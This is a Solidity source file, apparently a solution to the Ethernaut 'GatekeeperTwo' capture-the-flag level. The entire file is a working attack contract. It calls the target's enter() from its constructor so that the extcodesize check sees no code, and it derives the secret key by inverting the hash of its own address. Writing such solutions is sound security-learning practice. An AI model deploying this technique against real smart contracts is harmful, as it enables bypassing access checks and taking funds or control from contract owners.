// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

interface IGatekeeperTwo {
    function enter(bytes8 _key) external returns (bool);
}

contract GatekeeperTwoAttacker {
    error GatekeeperTwoAttacker__InvalidAddress();
    error GatekeeperTwoAttacker__FailedEntry();

    IGatekeeperTwo public gatekeeperTwo;

    constructor(address _gatekeeperTwo) {
        if (_gatekeeperTwo == address(0)) {
            revert GatekeeperTwoAttacker__InvalidAddress();
        }
        gatekeeperTwo = IGatekeeperTwo(_gatekeeperTwo);

        // Because of `extcodesize == 0`, we've decided to attack directly in the constructor to
        // avoid the caller being a contract.
        bytes8 key = ~bytes8(keccak256(abi.encodePacked(address(this))));
        bool success = gatekeeperTwo.enter(key);
        if (!success) revert GatekeeperTwoAttacker__FailedEntry();
    }
}
